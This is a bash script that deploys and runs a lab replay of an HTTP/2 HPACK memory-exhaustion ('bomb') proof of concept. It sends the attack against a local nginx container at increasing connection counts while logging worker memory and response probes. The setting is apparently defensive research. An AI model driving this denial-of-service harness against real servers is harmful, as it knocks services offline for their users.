#!/usr/bin/env bash
# Deploy + run HTTP/2 bomb lab replay on Proxmox ai-workstation (VM 200)
set -euo pipefail

REMOTE="${REMOTE:-danii@192.168.2.116}"
REMOTE_DIR="${REMOTE_DIR:-~/http2-bomb-lab}"
LOCAL_PLUGIN="${LOCAL_PLUGIN:-$HOME/.cursor/plugins/local/http2-bomb-mcp}"
MEM="${MEM:-8g}"
PORT="${PORT:-8443}"

echo "=== Deploy to $REMOTE ==="
ssh "$REMOTE" "mkdir -p $REMOTE_DIR/lab-replay $REMOTE_DIR/poc/nginx $REMOTE_DIR/logs"

rsync -az --delete \
  "$LOCAL_PLUGIN/lab-replay/" \
  "$REMOTE:$REMOTE_DIR/lab-replay/"

rsync -az \
  "$LOCAL_PLUGIN/vendor/califio-publications/MADBugs/http2-bomb/nginx/hpack_bomb.py" \
  "$LOCAL_PLUGIN/vendor/califio-publications/MADBugs/http2-bomb/nginx/monitor_rss.py" \
  "$REMOTE:$REMOTE_DIR/poc/nginx/"

echo "=== Build + start lab (memory=$MEM) on remote ==="
ssh "$REMOTE" bash -s <<REMOTE_EOF
set -euo pipefail
cd ~/http2-bomb-lab/lab-replay
chmod +x replay.sh
./replay.sh stop 2>/dev/null || true
./replay.sh build
MEM=$MEM PORT=$PORT ./replay.sh start $MEM
REMOTE_EOF

echo "=== Run blog-style attacks (1, 5, 15, 50 conn) ==="
LOG="lab_replay_proxmox_$(date +%Y%m%d_%H%M%S).log"
ssh "$REMOTE" bash -s <<'REMOTE_EOF' | tee "$LOCAL_PLUGIN/lab-replay/logs/$LOG"
set -euo pipefail
cd ~/http2-bomb-lab/lab-replay
PY=python3
POC=~/http2-bomb-lab/poc/nginx/hpack_bomb.py
PORT=8443

rss() {
  docker exec nginx-h2-lab-replay bash -c 'for p in $(pgrep -f "nginx: worker"); do awk "/VmRSS/ {printf \"%.0f MiB\", \$2/1024}" /proc/$p/status; done' 2>/dev/null || echo "0"
}

probe() {
  curl -sS -m 8 -o /dev/null -w "code=%{http_code} time=%{time_total}s" -k --http2 "https://127.0.0.1:${PORT}/" 2>&1 || echo FAIL
}

for N in 1 5 15 50; do
  echo ""
  echo "========== ATTACK N=$N =========="
  echo "RSS before: $(rss) | probe: $(probe)"
  T0=$(date +%s)
  $PY $POC --host 127.0.0.1 --port $PORT -n $N --hold 20 --drip-interval 50 2>&1 &
  PID=$!
  while kill -0 $PID 2>/dev/null; do
    echo "[$(date +%H:%M:%S)] RSS=$(rss) container=$(docker stats nginx-h2-lab-replay --no-stream --format '{{.MemUsage}}' 2>/dev/null) probe=$(probe)"
    sleep 5
  done
  wait $PID || true
  echo "RSS after: $(rss) | elapsed=$(( $(date +%s)-T0 ))s | probe: $(probe)"
  docker restart nginx-h2-lab-replay >/dev/null
  sleep 5
done
echo ""
echo "=== REPLAY COMPLETE ==="
REMOTE_EOF

echo ""
echo "Done. Local log: $LOCAL_PLUGIN/lab-replay/logs/$LOG"
echo "Remote: ssh $REMOTE 'cd ~/http2-bomb-lab/lab-replay && ./replay.sh rss'"
